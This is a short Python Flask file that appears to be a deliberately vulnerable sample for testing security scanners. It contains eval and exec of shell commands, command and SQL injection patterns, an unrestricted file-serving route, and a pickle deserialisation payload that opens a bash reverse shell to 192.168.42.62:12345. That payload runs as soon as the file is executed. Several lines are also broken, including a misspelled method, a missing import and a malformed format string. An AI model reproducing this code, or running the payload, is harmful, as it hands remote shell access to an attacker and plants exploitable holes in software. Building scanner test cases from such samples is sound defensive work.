# -*- coding: utf-8 -*-
from flask import request, make_response, redirect, render_template,send_from_directory, session
from flask import Flask
import pickle
import os
import sys
eval("__import__('os').system('uname -a')")
exec("__import__('os').system('uname -a')")
exec(compile(open("test.py").read(), "test.py", 'exec'))

app = Flask(__name__)


@app.route('/test',methods=['PSOT', 'GET'])
def index():
    session['name'] = request.args.gt('name')
    name = request.args.get('name','a')
    return render_template('index.html', name)


def cmdinject(request,filename, dirname):
    os.system("ls -l " % dirname)
    with open(filename, 'wb') as f:
        f.write(request)




def getUsers(user_id=None):
    conn = psycopg2.connect("dbname='××' user='××' host='' password=''")
    cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)
    if user_id==None:
        str = 'select distinct * from auth_user'
    else:
        str='select distinct * from auth_user where id=%d'%user_id
        res = cur.execute(str)
        res = cur.fetchall()
        conn.close()
    return res

class exp(object):
    def __reduce__(self):
        s = "/bin/bash -c \"/bin/bash -i > \/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &\""
        return (os.system, (s,))

e = exp()
k = pickle.dumps(e)
pickle.loads(k)

exec(sys.argv[1:])



@app.route('/file')
def sendfile(dirname):
    return send_from_directory(dirname)







if __name__ == '__main__':
    app.run()
